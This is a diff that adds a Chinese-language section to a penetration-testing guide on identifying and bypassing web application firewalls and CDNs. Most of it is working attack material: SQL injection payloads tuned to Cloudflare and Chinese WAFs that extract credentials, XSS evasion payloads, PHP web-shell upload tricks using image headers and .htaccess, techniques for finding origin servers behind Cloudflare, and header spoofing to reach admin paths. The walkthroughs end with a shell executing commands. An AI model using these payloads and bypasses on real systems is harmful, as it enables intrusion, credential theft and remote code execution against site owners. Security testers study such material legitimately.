@@ -826,3 +826,646 @@ diff true.txt false.txt                  # 布尔盲注？
 | 报告 | 100个误报 | 1-2个真漏洞或诚实承认无果 |
 
 **核心：22步框架是好的，但要真正深入做每一步，不是批量扫描。**
+
+## WAF/CDN识别与绕过（手工实战版）
+
+### WAF识别（5分钟快速判断）
+
+**目标：知道面对什么防护，才能针对性绕过**
+
+```bash
+TARGET="https://target.com"
+
+# 方法1：响应头特征
+curl -sI $TARGET | grep -iE "cloudflare|cf-ray|server|x-"
+
+# 常见WAF特征：
+# Cloudflare → CF-RAY, cloudflare
+# AWS WAF → x-amzn-requestid
+# Akamai → akamai
+# Imperva → incap, visid_incap
+# 阿里云盾 → aliyun
+# 360 → 360wzws
+
+# 方法2：触发拦截页面
+curl -sk "$TARGET?id=1' OR '1'='1--" -o /tmp/waf_test
+grep -iE "blocked|forbidden|waf|firewall|security" /tmp/waf_test
+
+# 方法3：使用wafw00f
+wafw00f $TARGET
+```
+
+**手工判断：**
+1. 查看响应头 → 确定WAF类型
+2. 测试简单payload → 看拦截特征
+3. 记录WAF类型 → 针对性绕过
+
+---
+
+## SQL注入WAF绕过（真实手工版）
+
+**不要批量测试！根据WAF类型选择payload！**
+
+### 绕过技巧1：空格替换（最常用）
+
+```bash
+# WAF通常拦截空格，手工替换：
+
+# 原始payload：
+' OR '1'='1--
+
+# 绕过方式：
+'/**/OR/**/'1'='1--          # 注释代替空格
+'%09OR%091=1--               # Tab代替
+'%0aOR%0a1=1--               # 换行
+'+OR+'1'='1--                # 加号
+'||'1'='1                    # 或运算符
+
+# 手工测试每个：
+TEST_URL="https://target.com/page?id=1"
+
+curl -sk "${TEST_URL}'/**/OR/**/'1'='1--" -o test1.txt
+curl -sk "${TEST_URL}'%09OR%091=1--" -o test2.txt
+
+# 对比哪个成功
+```
+
+### 绕过技巧2：大小写混淆
+
+```bash
+# 原始：
+' UNION SELECT--
+
+# 绕过：
+' UnIoN SeLeCt--
+' uNiOn sElEcT--
+
+# 测试：
+curl -sk "${TEST_URL}' UnIoN SeLeCt 1,2,3--"
+```
+
+### 绕过技巧3：内联注释（MySQL）
+
+```bash
+# MySQL特有：
+'/*!50000UNION*//*!50000SELECT*/1,2,3--
+'/*!12345OR*/1=1--
+
+# 版本号注释（绕过检测）
+```
+
+### 绕过技巧4：双重编码
+
+```bash
+# 单次编码：
+%27%20OR%201=1--
+
+# 双重编码（绕过解码检测）：
+%2527%2520OR%25201=1--
+
+# 手工测试：
+curl -sk "${TEST_URL}%2527%2520OR%25201=1--"
+```
+
+### 绕过技巧5：多字节编码（GBK）
+
+```bash
+# 宽字节注入（针对GBK编码）
+%df%27 OR 1=1--
+%bf%27 UNION SELECT--
+
+# 适用于中文网站
+```
+
+### 针对Cloudflare的SQL绕过
+
+```bash
+# Cloudflare特点：拦截常见SQL关键词
+
+# 方法1：使用内联注释
+'||(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables)--
+
+# 方法2：时间盲注（CF较难检测）
+'AND(SELECT*FROM(SELECT(SLEEP(5)))a)--
+
+# 方法3：布尔盲注
+'AND(SELECT+SUBSTRING(password,1,1)FROM+users+LIMIT+1)='a
+
+# 手工测试每个，观察响应
+```
+
+### 针对国内WAF（安全狗/云锁/D盾）
+
+```bash
+# 安全狗绕过：
+'/*!12345UNION*//*!12345SELECT*/1,2,3--
+
+# 云锁绕过：
+'AND(1)=(1)--
+'OR(1)=(1)--
+
+# D盾绕过：
+'%23%0aUNION%23%0aSELECT%23%0a1,2,3--
+
+# 手工测试，找到有效的
+```
+
+---
+
+## XSS WAF绕过（手工实战版）
+
+### 绕过技巧1：编码变换
+
+```javascript
+// HTML实体编码
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+// Unicode编码
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+
+// Base64
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+
+// Hex编码
+<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
+
+// 手工测试每个，看哪个绕过
+```
+
+### 绕过技巧2：标签变形
+
+```javascript
+// 不常用标签（WAF可能未拦）
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<select onfocus=alert(1) autofocus>
+
+// 手工测试每个标签
+```
+
+### 绕过技巧3：大小写混淆
+
+```javascript
+<ScRiPt>alert(1)</sCrIpT>
+<sCrIpT>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+```
+
+### 针对Cloudflare的XSS绕过
+
+```javascript
+// 事件分离
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+// 模板字符串
+<script>eval`alert\x281\x29`</script>
+
+// DOM型（CF难检测）
+#<img src=x onerror=alert(1)>
+```
+
+---
+
+## 文件上传WAF绕过（手工实战版）
+
+### 绕过技巧1：文件名变形
+
+```bash
+# 原始：
+shell.php
+
+# 绕过方式：
+shell.php.jpg        # 双扩展名
+shell.PhP            # 大小写
+shell.php5           # 罕见扩展名
+shell.phtml
+shell.phar
+shell.php.           # 末尾点（Windows）
+shell.php%00.jpg     # 空字节（部分环境）
+
+# 手工逐个测试：
+for ext in "php.jpg" "PhP" "php5" "phtml"; do
+    cp shell.php shell.$ext
+    curl -sk $UPLOAD_URL -F "file=@shell.$ext"
+    echo "---"
+done
+```
+
+### 绕过技巧2：MIME类型伪造
+
+```bash
+# 修改Content-Type
+curl -sk $UPLOAD_URL \
+    -F "file=@shell.php;type=image/jpeg"
+
+# 文件头伪造（图片马）
+echo -e "GIF89a\n<?php system(\$_GET['c']); ?>" > shell.gif
+curl -sk $UPLOAD_URL -F "file=@shell.gif"
+
+# PNG文件头
+printf "\x89PNG\r\n\x1a\n\x00\x00" > shell.png
+echo "<?php system(\$_GET['c']); ?>" >> shell.png
+curl -sk $UPLOAD_URL -F "file=@shell.png"
+```
+
+### 绕过技巧3：.htaccess配合
+
+```bash
+# 第一步：上传.htaccess（如果允许）
+echo "AddType application/x-httpd-php .jpg" > .htaccess
+curl -sk $UPLOAD_URL -F "file=@.htaccess"
+
+# 第二步：上传图片马
+echo '<?php system($_GET["c"]); ?>' > shell.jpg
+curl -sk $UPLOAD_URL -F "file=@shell.jpg"
+
+# 访问shell.jpg即可执行
+```
+
+---
+
+## Cloudflare真实IP发现（绕过CDN）
+
+**目标：找到源站IP，直接攻击绕过CF**
+
+### 方法1：历史DNS记录
+
+```bash
+# SecurityTrails
+curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
+    -H "APIKEY: YOUR_KEY" | jq -r '.records[].values[].ip'
+
+# 或手工查询：
+# https://securitytrails.com/domain/target.com/history/a
+```
+
+### 方法2：子域名扫描（找未开CF的）
+
+```bash
+# 扫描所有子域名
+subfinder -d target.com -silent | while read sub; do
+    ip=$(dig +short $sub | grep -E "^[0-9]")
+    
+    # 检查是否有CF
+    cf=$(curl -sI "https://$sub" | grep "cf-ray")
+    
+    if [ -z "$cf" ] && [ -n "$ip" ]; then
+        echo "$sub → $ip [无CF!]"
+    fi
+done
+```
+
+### 方法3：SSL证书反查
+
+```bash
+# crt.sh查询所有证书
+curl -s "https://crt.sh/?q=%.target.com&output=json" | \
+    jq -r '.[].name_value' | sort -u | while read domain; do
+    ip=$(dig +short $domain | head -1)
+    echo "$domain → $ip"
+done
+
+# 手工分析哪个IP是真实源站
+```
+
+### 方法4：邮件服务器（通常是真实IP）
+
+```bash
+dig +short MX target.com | awk '{print $2}' | while read mx; do
+    dig +short $mx
+done
+
+# MX记录通常指向真实服务器
+```
+
+### 方法5：直接访问真实IP
+
+```bash
+# 找到真实IP后
+REAL_IP="1.2.3.4"
+TARGET="target.com"
+
+# 方法A：修改hosts
+echo "$REAL_IP $TARGET" | sudo tee -a /etc/hosts
+curl -sk https://$TARGET
+
+# 方法B：使用--resolve
+curl -sk https://$TARGET --resolve $TARGET:443:$REAL_IP
+
+# 方法C：直接IP+Host头
+curl -sk https://$REAL_IP -H "Host: $TARGET"
+```
+
+---
+
+## 真实手工测试技巧
+
+### 手工技巧1：逐步分析响应差异
+
+```bash
+# 不要只看状态码，要看响应内容
+
+# 测试1：保存基线
+curl -sk "$URL" -o baseline.txt
+md5sum baseline.txt  # 记录hash
+
+# 测试2：注入payload
+curl -sk "$URL?id=1' OR '1'='1" -o test.txt
+md5sum test.txt
+
+# 手工对比：
+diff baseline.txt test.txt           # 完整差异
+wc -c baseline.txt test.txt          # 大小差异
+grep -c "error" baseline.txt test.txt # 错误数量
+
+# 不要只看grep "error"，要理解差异在哪
+```
+
+### 手工技巧2：理解WAF拦截特征
+
+```bash
+# 当被WAF拦截时，记录特征：
+
+# Cloudflare拦截页面：
+# - 状态码：403
+# - 包含："Attention Required"、"Cloudflare"
+# - Ray ID
+
+# 安全狗拦截：
+# - 包含："安全狗"、"SafeDog"
+# - 图片验证码
+
+# 云锁拦截：
+# - 包含："云锁"、"YunSuo"
+
+# 记录这些特征，判断是被WAF拦了还是正常403
+```
+
+### 手工技巧3：边界条件测试
+
+```bash
+# 不要只测明显的payload，测试边界
+
+# 例如：整数溢出
+curl "$URL?id=2147483647"      # int最大值
+curl "$URL?id=-2147483648"     # int最小值
+curl "$URL?id=9999999999999"   # 超大数
+
+# 例如：空值/特殊值
+curl "$URL?param="             # 空
+curl "$URL?param=null"         # null
+curl "$URL?param=undefined"    # undefined
+curl "$URL?param=[]"           # 空数组
+curl "$URL?param={}"           # 空对象
+
+# 例如：长字符串
+curl "$URL?param=$(python3 -c 'print("A"*10000)')"
+
+# 这些可能触发意外错误，泄露信息
+```
+
+---
+
+## 真实的WAF绕过案例（手工）
+
+### 案例1：Cloudflare SQL注入绕过
+
+```bash
+TARGET="https://target.com/search?q=test"
+
+# 第1步：确认被CF保护
+curl -sI $TARGET | grep "cf-ray"
+
+# 第2步：基础payload被拦（403）
+curl -sk "${TARGET}' OR 1=1--" -w "%{http_code}"
+# 结果：403 Forbidden
+
+# 第3步：尝试注释绕过
+curl -sk "${TARGET}'/**/OR/**/1=1--" -w "%{http_code}"
+# 结果：403（还是被拦）
+
+# 第4步：尝试大小写
+curl -sk "${TARGET}' Or 1=1--" -w "%{http_code}"
+# 结果：403
+
+# 第5步：尝试编码
+curl -sk "${TEST_URL}'%09OR%091=1--" -w "%{http_code}"
+# 结果：200！成功绕过！
+
+# 第6步：深度利用
+curl -sk "${TEST_URL}'%09UNION%09SELECT%091,2,3--"
+
+# 关键：手工逐个测试，找到真正有效的
+```
+
+### 案例2：文件上传绕过安全狗
+
+```bash
+UPLOAD_URL="https://target.com/upload"
+
+# 第1步：测试基础php上传
+echo "<?php phpinfo(); ?>" > test.php
+curl -sk $UPLOAD_URL -F "file=@test.php"
+# 结果：被安全狗拦截
+
+# 第2步：双扩展名
+cp test.php test.php.jpg
+curl -sk $UPLOAD_URL -F "file=@test.php.jpg"
+# 结果：被拦截
+
+# 第3步：大小写
+cp test.php test.PhP
+curl -sk $UPLOAD_URL -F "file=@test.PhP"
+# 结果：成功上传！
+
+# 第4步：访问验证
+curl -sk "https://target.com/uploads/test.PhP?c=id"
+# 结果：执行成功！
+
+# 关键：不是测试所有变体，而是理解安全狗的规则
+```
+
+### 案例3：XSS绕过云锁
+
+```bash
+# 第1步：基础XSS被拦
+PAYLOAD="<script>alert(1)</script>"
+curl -sk "$TARGET/comment" -d "content=$PAYLOAD"
+# 结果：被云锁拦截
+
+# 第2步：大小写绕过
+PAYLOAD="<ScRiPt>alert(1)</sCrIpT>"
+curl -sk "$TARGET/comment" -d "content=$PAYLOAD"
+# 结果：还是被拦
+
+# 第3步：事件处理器
+PAYLOAD="<img src=x onerror=alert(1)>"
+curl -sk "$TARGET/comment" -d "content=$PAYLOAD"
+# 结果：成功！
+
+# 第4步：确认执行
+# 访问评论页面，查看是否弹窗
+```
+
+---
+
+## 手工绕过WAF的核心思路
+
+### 思路1：理解WAF的检测规则
+
+**WAF检测什么？**
+1. 关键词（SELECT/UNION/script）
+2. 特殊字符（', ", <, >）
+3. 模式匹配（正则）
+4. 请求频率
+
+**绕过方向：**
+1. 替换关键词 → 大小写/编码/注释
+2. 替换特殊字符 → 编码/等价符号
+3. 变形模式 → 改变payload结构
+4. 降低频率 → 手工慢速测试
+
+### 思路2：一次只改一个地方
+
+```bash
+# 错误方式：一次用所有绕过技巧
+'%2527%09/*!UNION*/%09SeLeCt%091,2,3--
+# 问题：如果失败，不知道哪个技巧有效
+
+# 正确方式：逐步尝试
+curl -sk "$URL' OR 1=1--"              # 基线（被拦）
+curl -sk "$URL'%20OR%201=1--"          # 编码空格（被拦）
+curl -sk "$URL'/**/OR/**/1=1--"        # 注释空格（成功！）
+
+# 确认：注释可绕过，继续用这个技巧
+curl -sk "$URL'/**/UNION/**/SELECT/**/1,2,3--"
+```
+
+### 思路3：组合有效的技巧
+
+```bash
+# 发现有效的绕过方法：
+# 1. /**/ 注释代替空格 → 有效
+# 2. 大小写 → 无效
+# 3. 双重编码 → 无效
+
+# 那就专注用方法1：
+'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
+
+# 不要盲目组合所有方法
+```
+
+---
+
+## 协议/请求层绕过
+
+### 绕过技巧1：HTTP/2降级
+
+```bash
+# Cloudflare HTTP/2默认
+curl -sk --http1.1 https://target.com
+
+# 某些WAF规则只检测HTTP/2
+```
+
+### 绕过技巧2：请求头伪造
+
+```bash
+# 伪装成内部请求
+curl -sk https://target.com/admin \
+    -H "X-Forwarded-For: 127.0.0.1" \
+    -H "X-Real-IP: 127.0.0.1" \
+    -H "X-Originating-IP: 127.0.0.1" \
+    -H "Client-IP: 127.0.0.1"
+
+# 伪装成爬虫（可能白名单）
+curl -sk https://target.com \
+    -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
+```
+
+### 绕过技巧3：路径重写
+
+```bash
+# 访问/admin被拦
+curl -sk https://target.com/admin
+# 403
+
+# 尝试头伪造
+curl -sk https://target.com \
+    -H "X-Original-URL: /admin"
+# 200！绕过！
+
+curl -sk https://target.com \
+    -H "X-Rewrite-URL: /admin"
+```
+
+---
+
+## 慢速测试（避免触发限制）
+
+```bash
+# 手工控制速度
+
+# 方法1：随机延时
+for id in {1..100}; do
+    curl -sk "$TARGET/api/user/$id"
+    sleep $(shuf -i 3-10 -n 1)  # 随机3-10秒
+done
+
+# 方法2：固定延时
+for payload in "${PAYLOADS[@]}"; do
+    curl -sk "$TARGET?id=$payload"
+    sleep 5
+done
+
+# 方法3：单线程慢速
+# 不要用&并发，一个一个来
+```
+
+---
+
+## 手工验证绕过成功的标准
+
+```bash
+# 不要只看状态码！
+
+# 1. 保存被拦截的响应
+curl -sk "$URL?id=1' OR 1=1--" -o blocked.txt
+grep -i "blocked\|forbidden\|waf" blocked.txt
+# 确认：被WAF拦截
+
+# 2. 测试绕过payload
+curl -sk "$URL?id=1'/**/OR/**/1=1--" -o bypass.txt
+
+# 3. 手工对比
+if ! grep -qi "blocked\|forbidden\|waf" bypass.txt; then
+    echo "✅ 可能绕过WAF！"
+    
+    # 4. 进一步确认：看是否有SQL执行结果
+    if grep -qi "user\|admin\|database" bypass.txt; then
+        echo "✅✅✅ 绕过成功且SQL被执行！"
+        cat bypass.txt
+    fi
+fi
+```
+
+---
+
+## 总结：真正手工的WAF绕过
+
+**原则：**
+1. ✅ 先识别WAF类型
+2. ✅ 针对性选择3-5个绕过技巧
+3. ✅ 手工逐个测试
+4. ✅ 理解哪个有效，为什么
+5. ✅ 组合有效技巧深度利用
+
+**不要：**
+1. ❌ 批量测试100个payload
+2. ❌ 不管WAF类型，盲目尝试
+3. ❌ 只看状态码，不看内容
+4. ❌ 把被拦当成"可能绕过"
+
+**核心：手工 > 自动，理解 > 盲测**
